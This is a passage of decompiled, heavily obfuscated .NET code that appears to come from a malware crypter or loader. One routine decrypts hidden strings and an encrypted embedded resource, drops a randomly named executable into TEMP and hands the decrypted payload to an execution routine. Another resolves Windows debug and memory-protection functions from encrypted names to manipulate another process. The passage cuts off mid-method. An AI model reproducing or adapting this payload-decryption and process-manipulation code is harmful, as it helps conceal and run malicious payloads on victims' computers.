		class29_0.byte_0[class29_0.int_0++] = (byte)int_0;
		class29_0.int_0 &= 32767;
	}

	static byte[] smethod_62(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class17.smethod_196(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class26.Stream0 stream = new Class26.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class17.smethod_111(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class17.smethod_70(stream);
			int num3 = Class17.smethod_70(stream);
			int num4 = Class17.smethod_70(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class17.smethod_111(stream);
			Class17.smethod_111(stream);
			Class17.smethod_111(stream);
			int num5 = Class17.smethod_111(stream);
			int num6 = Class17.smethod_70(stream);
			int num7 = Class17.smethod_70(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class26.Class27 class27_ = new Class26.Class27(array2);
			array = new byte[num5];
			Class17.smethod_93(array.Length, class27_, array, 0);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class17.smethod_111(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class17.smethod_111(stream);
					num11 = Class17.smethod_111(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class26.Class27 class27_2 = new Class26.Class27(array3);
					Class17.smethod_93(num11, class27_2, array, i);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 101, 148, 214, 187, 157, 75, 11, 93 };
				byte[] byte_2 = new byte[8] { 186, 97, 111, 86, 147, 156, 130, 136 };
				using ICryptoTransform cryptoTransform = Class17.smethod_123(bool_0: true, byte_2, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class17.smethod_62(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class17.smethod_104(bool_0: true, byte_5, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class17.smethod_62(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static int smethod_63(Class26.Class28 class28_0, int int_0)
	{
		if (class28_0.int_2 < int_0)
		{
			if (class28_0.int_0 == class28_0.int_1)
			{
				return -1;
			}
			class28_0.uint_0 |= (uint)(((class28_0.byte_0[class28_0.int_0++] & 0xFF) | ((class28_0.byte_0[class28_0.int_0++] & 0xFF) << 8)) << class28_0.int_2);
			class28_0.int_2 += 16;
		}
		return (int)(class28_0.uint_0 & ((1 << int_0) - 1));
	}

	static bool smethod_64(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_2;
	}

	static void smethod_65(EventArgs0 eventArgs0_0, Class40 class40_0)
	{
		while (true)
		{
			Delegate13 delegate13_ = class40_0.delegate13_0;
			while (true)
			{
				IL_0044:
				if (delegate13_ == null)
				{
					return;
				}
				while (true)
				{
					delegate13_(class40_0, eventArgs0_0);
					int num = 5;
					if (oLMEnfKBTsIqRDPCqp())
					{
						break;
					}
					while (true)
					{
						switch (num)
						{
						default:
							num = 3;
							if (LDM65EyL5AHhD5120V())
							{
								continue;
							}
							return;
						case 2:
						case 3:
							break;
						case 4:
							goto IL_0044;
						case 0:
						case 1:
							goto end_IL_002e;
						case 5:
							return;
						}
						break;
					}
					continue;
					end_IL_002e:
					break;
				}
				break;
			}
		}
	}

	static bool smethod_66(int int_0, Class26.Class33 class33_0, int int_1)
	{
		class33_0.short_0[class33_0.int_1] = (short)int_1;
		class33_0.byte_1[class33_0.int_1++] = (byte)(int_0 - 3);
		int num = Class17.smethod_55(class33_0, int_0 - 3);
		class33_0.class34_0.short_0[num]++;
		if (num >= 265 && num < 285)
		{
			class33_0.int_2 += (num - 261) / 4;
		}
		int num2 = Class17.smethod_150(class33_0, int_1 - 1);
		class33_0.class34_1.short_0[num2]++;
		if (num2 >= 4)
		{
			class33_0.int_2 += num2 / 2 - 1;
		}
		return Class17.smethod_169(class33_0);
	}

	static void smethod_67(Class26.Class33.Class34 class34_0, Class26.Class33.Class34 class34_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class34_0.int_1)
		{
			int num3 = 1;
			while (true)
			{
				IL_00b8:
				int num4 = class34_0.byte_0[num2];
				int num5;
				int num6;
				if (num4 != 0)
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						class34_1.short_0[num4]++;
						goto IL_00a6;
					}
				}
				else
				{
					num5 = 138;
					num6 = 3;
				}
				goto IL_00a8;
				IL_00a6:
				num3 = 0;
				goto IL_00a8;
				IL_00a8:
				while (true)
				{
					IL_00a8_2:
					num = num4;
					while (true)
					{
						IL_00a0:
						num2++;
						while (num2 < class34_0.int_1 && num == class34_0.byte_0[num2])
						{
							num2++;
							while (++num3 < num5)
							{
								if (!oLMEnfKBTsIqRDPCqp())
								{
									switch (4)
									{
									case 1:
										break;
									case 4:
									case 6:
										goto IL_0095;
									default:
										goto IL_00a0;
									case 3:
										goto IL_00a6;
									case 2:
									case 5:
										goto IL_00a8_2;
									case 0:
										goto IL_00b8;
									case 8:
									case 9:
										goto end_IL_00b8;
									}
									continue;
								}
								goto end_IL_00b8;
							}
							break;
							IL_0095:;
						}
						break;
					}
					break;
				}
				if (num3 < num6)
				{
					class34_1.short_0[num] += (short)num3;
				}
				else if (num != 0)
				{
					class34_1.short_0[16]++;
				}
				else if (num3 <= 10)
				{
					class34_1.short_0[17]++;
				}
				else
				{
					class34_1.short_0[18]++;
				}
				break;
				continue;
				end_IL_00b8:
				break;
			}
		}
	}

	static int smethod_68(int int_0, Class26.Class29 class29_0, byte[] byte_0, int int_1)
	{
		int num = class29_0.int_0;
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		int num2 = default(int);
		int num3 = default(int);
		switch (4)
		{
		case 4:
			if (int_1 > class29_0.int_1)
			{
				int_1 = class29_0.int_1;
			}
			else
			{
				num = (class29_0.int_0 - class29_0.int_1 + int_1) & 0x7FFF;
			}
			goto default;
		default:
			num2 = int_1;
			num3 = int_1 - num;
			if (num3 > 0)
			{
				Array.Copy(class29_0.byte_0, 32768 - num3, byte_0, int_0, num3);
				goto case 2;
			}
			goto IL_0086;
		case 2:
		case 3:
			int_0 += num3;
			int_1 = num;
			goto IL_0086;
		case 6:
			break;
			IL_0086:
			Array.Copy(class29_0.byte_0, num - int_1, byte_0, int_0, int_1);
			class29_0.int_1 -= num2;
			if (class29_0.int_1 >= 0)
			{
				return num2;
			}
			break;
		}
		throw new InvalidOperationException();
	}

	static void smethod_69(Class47 class47_0)
	{
		try
		{
			Graphics val = ((Control)class47_0).CreateGraphics();
			try
			{
				string text = ((Control)class47_0).get_Text();
				Font font = ((Control)class47_0).get_Font();
				int width = ((Control)class47_0).get_Width();
				int num = Class17.smethod_165(text, width, val, font);
				if (num > 0)
				{
					((Control)class47_0).set_Height(num);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static int smethod_70(Class26.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_71(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class17.smethod_9("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static void smethod_72(Class26.Class33.Class34 class34_0, int int_0)
	{
		Class17.smethod_174(class34_0.class33_0.class36_0, class34_0.short_1[int_0] & 0xFFFF, (int)class34_0.byte_0[int_0]);
	}

	static string smethod_73(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static void smethod_74(EventHandler eventHandler_0, Class40 class40_0)
	{
		EventHandler eventHandler = class40_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class40_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static void smethod_75()
	{
		try
		{
			Class22.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static bool smethod_76(int int_0, Class26.Class33 class33_0)
	{
		class33_0.short_0[class33_0.int_1] = 0;
		while (true)
		{
			class33_0.byte_1[class33_0.int_1++] = (byte)int_0;
			while (true)
			{
				class33_0.class34_0.short_0[int_0]++;
				if (oLMEnfKBTsIqRDPCqp())
				{
				}
				switch (4)
				{
				default:
					continue;
				case 0:
				case 2:
					break;
				case 4:
					return Class17.smethod_169(class33_0);
				}
				break;
			}
		}
	}

	static Class26.Class30 smethod_77(Class26.Class31 class31_0)
	{
		byte[] array = new byte[class31_0.int_3];
		Array.Copy(class31_0.byte_1, 0, array, 0, class31_0.int_3);
		return new Class26.Class30(array);
	}

	static void smethod_78(Form0 form0_0)
	{
		try
		{
			((Control)form0_0.panel_2).set_Visible(false);
			((Control)form0_0.panel_1).set_Visible(true);
			if (form0_0.eventArgs1_0 != null)
			{
				Class17.smethod_60(form0_0, (ThreadStart)form0_0.method_10);
			}
		}
		catch
		{
		}
	}

	static string smethod_79()
	{
		return "SmartAssembly" + " " + Class17.smethod_81();
	}

	static void smethod_80(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class17.smethod_128(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static int smethod_81()
	{
		Version version = new Version("6.9.0.114");
		return version.Major;
	}

	static Enum1 smethod_82(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.enum1_0;
	}

	static void smethod_83(Exception exception_0, object object_0)
	{
		Class17.smethod_128(exception_0, new object[1] { object_0 });
	}

	static int smethod_84(Class26.Class36 class36_0)
	{
		return class36_0.int_2;
	}

	static void smethod_85(Control1 control1_0, Enum2 enum2_0)
	{
		while (control1_0.enum2_0 != enum2_0)
		{
			while (true)
			{
				IL_007d:
				control1_0.enum2_0 = enum2_0;
				while (true)
				{
					switch (control1_0.enum2_0)
					{
					case Enum2.const_2:
						control1_0.bitmap_0 = Class17.smethod_9("warning16");
						goto IL_0016;
					default:
						control1_0.bitmap_0 = null;
						goto IL_0016;
					case Enum2.const_1:
						{
							control1_0.bitmap_0 = Class17.smethod_9("error16");
							goto IL_0016;
						}
						IL_0016:
						((Control)control1_0).Refresh();
						if (oLMEnfKBTsIqRDPCqp())
						{
							break;
						}
						switch (6)
						{
						case 2:
							continue;
						case 0:
						case 1:
							goto IL_007d;
						case 4:
							goto end_IL_006e;
						case 6:
							return;
						}
						goto default;
						end_IL_006e:
						break;
					}
					break;
				}
				break;
			}
		}
	}

	static string smethod_86(string string_0)
	{
		string s = "贵日认美朋会贵家";
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			while (true)
			{
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
				Array.Copy(sourceArray, 0, array, 0, 10);
				Array.Copy(sourceArray, 0, array, 15, 10);
				while (true)
				{
					rijndaelManaged.Key = array;
					while (true)
					{
						IL_0071:
						rijndaelManaged.Mode = CipherMode.ECB;
						ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
						while (true)
						{
							byte[] array2 = Convert.FromBase64String(string_0);
							text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
							if (!LDM65EyL5AHhD5120V())
							{
								break;
							}
							switch (6)
							{
							case 3:
							case 5:
								break;
							default:
								goto IL_0071;
							case 4:
								goto end_IL_0023;
							case 0:
							case 1:
								goto end_IL_0083;
							case 6:
								result = text;
								return result;
							}
							continue;
							end_IL_0023:
							break;
						}
						break;
					}
					continue;
					end_IL_0083:
					break;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static Class26.Class30 smethod_87(Class26.Class31 class31_0)
	{
		byte[] array = new byte[class31_0.int_4];
		Array.Copy(class31_0.byte_1, class31_0.int_3, array, 0, class31_0.int_4);
		return new Class26.Class30(array);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_2([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static Assembly smethod_88()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_89(Class5.Class10 class10_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object executablePath = default(object);
		string text2 = default(string);
		bool flag = default(bool);
		ResourceManager resourceManager = default(ResourceManager);
		string text3 = default(string);
		string text4 = default(string);
		byte[] array = default(byte[]);
		string sourceFileName = default(string);
		string text6 = default(string);
		byte[] byte_ = default(byte[]);
		byte[] array3 = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				byte[] array2;
				string text5;
				bool flag2;
				string empty;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 849:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0057;
						case 6:
							goto IL_005d;
						case 7:
							goto IL_00c0;
						case 8:
						case 9:
							goto IL_00c6;
						case 10:
						case 11:
							goto IL_00ca;
						case 12:
							goto IL_00df;
						case 13:
							goto IL_00fe;
						case 14:
							goto IL_0113;
						case 15:
						case 16:
							goto IL_0121;
						case 17:
							goto IL_013b;
						case 18:
							goto IL_0141;
						case 19:
							goto IL_0152;
						case 21:
							goto IL_015a;
						case 22:
							goto IL_015e;
						case 24:
							goto IL_0177;
						case 20:
						case 23:
						case 25:
						case 26:
						case 27:
							goto IL_017b;
						case 28:
							goto IL_0186;
						case 29:
							goto IL_01b4;
						case 30:
							goto IL_01ba;
						case 31:
							goto IL_01c4;
						case 32:
							goto IL_01dd;
						case 33:
							goto IL_01f4;
						case 34:
							goto IL_020b;
						case 35:
							goto IL_0214;
						case 36:
							goto IL_0226;
						case 37:
							goto IL_0234;
						case 38:
							goto IL_0271;
						case 39:
							goto IL_027a;
						case 40:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 41:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_027a:
					num = 39;
					Thread.Sleep(10000);
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002b;
					IL_002b:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0034;
					IL_0034:
					num = 4;
					text2 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_0057;
					IL_0057:
					num = 5;
					flag = false;
					goto IL_005d;
					IL_005d:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual((object)(text2 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + ""), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object)""), (object)""), false))
					{
						goto IL_00c0;
					}
					goto IL_00c6;
					IL_00c0:
					num = 7;
					flag = true;
					goto IL_00c6;
					IL_00c6:
					num = 9;
					goto IL_00ca;
					IL_00ca:
					num = 11;
					resourceManager = new ResourceManager("好零美没见您", Assembly.GetExecutingAssembly());
					goto IL_00df;
					IL_00df:
					num = 12;
					text3 = "" + Interaction.Environ("TEMP") + "";
					goto IL_00fe;
					IL_00fe:
					num = 13;
					if (Class17.smethod_30(Class17.smethod_86("oAJ9Pm/REVvo5UjKLLNqMA==")))
					{
						goto IL_0113;
					}
					goto IL_0121;
					IL_0113:
					num = 14;
					Thread.Sleep(15001);
					goto IL_0121;
					IL_0121:
					num = 16;
					text4 = Class17.smethod_86("qJ1rx6zo0JWv6cXezCyOGQ==") + ".exe";
					goto IL_013b;
					IL_013b:
					num = 17;
					array = array;
					goto IL_0141;
					IL_0141:
					num = 18;
					array2 = Class17.smethod_180("fsfsdfsdfsdfsdf", array);
					goto IL_0152;
					IL_0152:
					num = 19;
					if (!flag)
					{
						goto IL_015a;
					}
					goto IL_017b;
					IL_015a:
					num = 21;
					goto IL_015e;
					IL_015e:
					num = 22;
					if (!Operators.ConditionalCompareObjectEqual(executablePath, (object)(text2 + "#nsdffdsp#$$$.exe$$$"), false))
					{
						goto IL_0177;
					}
					goto IL_017b;
					IL_0177:
					num = 24;
					goto IL_017b;
					IL_017b:
					num = 27;
					text5 = "";
					goto IL_0186;
					IL_0186:
					num = 28;
					sourceFileName = Interaction.Environ(Class17.smethod_86("rRhnphBugUiRcVlpVgLfjw==")) + Class17.smethod_86("ijulUbn8DPPkee8Mdv0Pf3JPXTMNWvYRORO+JfoPSAU=") + Class17.smethod_86("RmHHgWXRYcJTbievhyZVDA==");
					goto IL_01b4;
					IL_01b4:
					num = 29;
					flag2 = false;
					goto IL_01ba;
					IL_01ba:
					num = 30;
					empty = string.Empty;
					goto IL_01c4;
					IL_01c4:
					num = 31;
					text6 = "" + text3 + "\\" + text4;
					goto IL_01dd;
					IL_01dd:
					num = 32;
					byte_ = (byte[])resourceManager.GetObject("那么那方会见");
					goto IL_01f4;
					IL_01f4:
					num = 33;
					array3 = Class17.smethod_180(Class17.smethod_86("axfXKc1uSPw22HSCJhAWEa6DjhDSpCiOMzx2Wd3rCNIeUVvr7X0cLx7c6+sI2SXe"), byte_);
					goto IL_020b;
					IL_020b:
					num = 34;
					Class17.smethod_143();
					goto IL_0214;
					IL_0214:
					num = 35;
					File.Delete(text2 + text4);
					goto IL_0226;
					IL_0226:
					num = 36;
					File.Copy(sourceFileName, text6, overwrite: true);
					goto IL_0234;
					IL_0234:
					num = 37;
					Class17.smethod_28(new object[5]
					{
						string.Empty,
						array3,
						false,
						false,
						text6
					});
					goto IL_0271;
					IL_0271:
					num = 38;
					Class17.smethod_158();
					goto IL_027a;
					end_IL_0000_2:
					break;
				}
				num = 40;
				Class17.smethod_178();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 849;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_90(Class26.Class35 class35_0, byte[] byte_0)
	{
		class35_0.byte_1 = byte_0;
		if (LDM65EyL5AHhD5120V())
		{
			switch (2)
			{
			case 0:
			case 2:
				break;
			default:
				goto IL_0034;
			}
		}
		class35_0.int_7 = 0;
		goto IL_0034;
		IL_0034:
		class35_0.int_8 = byte_0.Length;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_3([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static bool smethod_91()
	{
		return Class17.smethod_95().byte_0 == 1;
	}

	static void smethod_92()
	{
		try
		{
			Class17.smethod_96();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_93(int int_0, Class26.Class27 class27_0, byte[] byte_0, int int_1)
	{
		int num = 0;
		int num2 = default(int);
		while (true)
		{
			if (class27_0.int_4 != 11)
			{
				goto IL_004b;
			}
			goto IL_006b;
			IL_006b:
			if (Class17.smethod_45(class27_0))
			{
				continue;
			}
			if (Class17.smethod_7(class27_0.class29_0) <= 0)
			{
				break;
			}
			if (class27_0.int_4 != 11)
			{
				continue;
			}
			if (!oLMEnfKBTsIqRDPCqp())
			{
				switch (6)
				{
				case 5:
					break;
				case 1:
				case 4:
					goto IL_005a;
				default:
					goto IL_005f;
				case 0:
					goto IL_0063;
				case 6:
					goto end_IL_0073;
				}
				goto IL_004b;
			}
			break;
			IL_004b:
			num2 = Class17.smethod_68(int_1, class27_0.class29_0, byte_0, int_0);
			goto IL_005a;
			IL_005a:
			int_1 += num2;
			goto IL_005f;
			IL_005f:
			num += num2;
			goto IL_0063;
			IL_0063:
			int_0 -= num2;
			if (int_0 == 0)
			{
				return num;
			}
			goto IL_006b;
			continue;
			end_IL_0073:
			break;
		}
		return num;
	}

	static void smethod_94(Class26.Class33.Class34 class34_0, int[] int_0)
	{
		class34_0.byte_0 = new byte[class34_0.short_0.Length];
		int num = 1;
		if (oLMEnfKBTsIqRDPCqp())
		{
			goto IL_0023;
		}
		goto IL_01cf;
		IL_01cf:
		int num11 = default(int);
		int num9 = default(int);
		int[] array = default(int[]);
		int num7 = default(int);
		int num2 = default(int);
		int num8 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			switch (num)
			{
			case 8:
				goto IL_0034;
			case 5:
				goto IL_0067;
			case 2:
				goto IL_008d;
			case 4:
				class34_0.int_2[num11 - 1]++;
				goto case 11;
			case 11:
				class34_0.byte_0[int_0[2 * num9]] = (byte)array[num9];
				goto IL_013d;
			case 10:
				array = new int[num7];
				array[num7 - 1] = 0;
				goto case 0;
			case 0:
			case 3:
				num9 = num7 - 1;
				goto IL_00f5;
			case 9:
			{
				for (int i = 0; i < class34_0.int_3; i++)
				{
					class34_0.int_2[i] = 0;
				}
				num = 10;
				if (!oLMEnfKBTsIqRDPCqp())
				{
					continue;
				}
				goto case 11;
			}
			case 1:
				num7 = int_0.Length / 2;
				num2 = (num7 + 1) / 2;
				num8 = 0;
				goto case 9;
			case 7:
				num3 = 2 * num2;
				num4 = class34_0.int_3;
				goto case 13;
			case 13:
				{
					while (num4 != 0)
					{
						int num5 = class34_0.int_2[num4 - 1];
						while (num5 > 0)
						{
							int num6 = 2 * int_0[num3++];
							if (int_0[num6 + 1] == -1)
							{
								class34_0.byte_0[int_0[num6]] = (byte)num4;
								num5--;
							}
						}
						num4--;
					}
					return;
				}
				IL_013d:
				num9--;
				goto IL_00f5;
				IL_00f5:
				if (num9 < 0)
				{
					break;
				}
				if (int_0[2 * num9 + 1] != -1)
				{
					int num10 = array[num9] + 1;
					if (num10 > class34_0.int_3)
					{
						num10 = class34_0.int_3;
						num8++;
					}
					array[int_0[2 * num9]] = (array[int_0[2 * num9 + 1]] = num10);
					goto IL_013d;
				}
				num11 = array[num9];
				goto case 4;
			}
			break;
		}
		goto IL_0023;
		IL_0067:
		int num12 = default(int);
		if (num12 < class34_0.int_3 - 1)
		{
			goto IL_0072;
		}
		goto IL_008d;
		IL_008d:
		if (num8 > 0)
		{
			goto IL_0091;
		}
		class34_0.int_2[class34_0.int_3 - 1] += num8;
		class34_0.int_2[class34_0.int_3 - 2] -= num8;
		num = 7;
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		goto IL_01cf;
		IL_0023:
		if (num8 != 0)
		{
			num12 = class34_0.int_3 - 1;
			goto IL_0091;
		}
		return;
		IL_0034:
		class34_0.int_2[++num12]++;
		num8 -= 1 << class34_0.int_3 - 1 - num12;
		if (num8 > 0)
		{
			goto IL_0067;
		}
		goto IL_008d;
		IL_0072:
		class34_0.int_2[num12]--;
		goto IL_0034;
		IL_0091:
		while (class34_0.int_2[--num12] == 0)
		{
		}
		goto IL_0072;
	}

	static Class51.Struct16 smethod_95()
	{
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		switch (2)
		{
		case 0:
		case 2:
			if (Class51.bool_0)
			{
				break;
			}
			goto case 1;
		case 1:
		case 3:
			Class51.struct16_0 = default(Class51.Struct16);
			goto default;
		default:
			try
			{
				Class51.struct16_0.int_0 = Marshal.SizeOf(typeof(Class51.Struct16));
				GetVersionEx(ref Class51.struct16_0);
				Class51.bool_0 = true;
			}
			catch
			{
			}
			break;
		}
		return Class51.struct16_0;
	}

	static void smethod_96()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class17.smethod_163;
		}
		catch
		{
		}
	}

	static void smethod_97(uint uint_0, int int_0, Class16.Struct0 struct0_0)
	{
		Class16.Delegate9 @delegate = Class13.smethod_0<Class16.Delegate9>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("IZRPfMpaEgyR6ZDyXnOYiJx08Wzx4ZAZWC/PdMnfamo="));
		Class16.Delegate10 delegate2 = Class13.smethod_0<Class16.Delegate10>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("8E4kyZwlQ3AJzMDUyZVD4tOSfAQxWsmg1leG/X3uOQo="));
		Class16.Delegate11 delegate3 = Class13.smethod_0<Class16.Delegate11>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("zyY3vUJrmonBTUubJ9UCC5TzDHj71hXOJ3SGrrAKtvU="));
		Class16.Delegate12 delegate4 = Class13.smethod_0<Class16.Delegate12>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("WNauUailUhceWvNacXsoZYxTSn28xUnXdaZLyAiTtuU="));
		Class16.Delegate0 delegate5 = Class13.smethod_0<Class16.Delegate0>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("w0qEzcCa4McG97qE1cgACdQlprmDa117VKUX1amgZAo="));
		Class16.Delegate8 delegate6 = Class13.smethod_0<Class16.Delegate8>(Class17.smethod_188("pdd3zZ5lwXtj8hV1GKRfVw=="), Class17.smethod_188("qt4tHmTORXFlu08c+szp/A=="));
		checked
		{
			if (!@delegate((int)struct0_0.uint_0))
			{
				throw new Exception();
			}
			delegate3(KillOnExit: false);
			uint uint_ = 64u;
			bool flag = true;
			Class12 class12_ = default(Class12);
			while (true)
			{
				if (flag)
				{
					Class16.Struct2 lpDebugEvent = default(Class16.Struct2);
					if (!delegate2(out lpDebugEvent, -1))
					{
						break;
					}
					switch (lpDebugEvent.enum0_0)
					{
					case Class16.Enum0.const_2:
						if (lpDebugEvent.method_0().struct4_0.uint_0 == 2147483649u)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							if (delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref uint_))
							{
							}
							break;
						}
						Thread.Sleep(400);
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_0264;
					case Class16.Enum0.const_0:
					{
						try
						{
							delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref uint_);
							Thread.Sleep(400);
							delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref uint_);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Thread.Sleep(400);
							delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref uint_);
							delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref uint_);
							ProjectData.ClearProjectError();
						}
						uint SuspendCount = 0u;
						Thread.Sleep(400);
						if (delegate6(struct0_0.intptr_1, out SuspendCount) != -1)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							goto IL_0264;
						}
						throw new Exception("gds");
					}
					default:
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_0264;
					case Class16.Enum0.const_3:
						{
							flag = false;
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
							goto IL_0264;
						}
						IL_0264:
						GC.Collect();
						break;
					}
					continue;
				}
				try
				{
					string string_ = "fsdfsd";
					DhcpDeRegisterParamChange(15L, ref string_);
					string_ = "fsdfsdgsdgsdgsd";
